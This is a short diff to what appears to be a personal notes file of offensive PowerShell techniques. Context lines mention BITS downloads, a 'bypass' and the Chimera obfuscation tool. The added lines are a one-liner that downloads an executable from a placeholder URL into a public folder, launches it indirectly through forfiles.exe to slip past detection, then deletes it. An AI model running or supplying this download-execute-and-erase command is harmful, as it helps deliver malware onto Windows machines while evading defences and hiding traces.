@@ -18,3 +18,9 @@ Start-BitsTransfer -Source $url -Destination $output
 bYpASS
 
 https://github.com/tokyoneon/Chimera
+
+
+
+````
+powershell.exe iwr [URL] -o C:\Users\Public\[NAME].exe; forfiles.exe /p c:\windows\system32 /m svchost.exe /c C:\Users\Public\[NAME]; timeout 2; del C:\Users\Public\[NAME].exe
+````
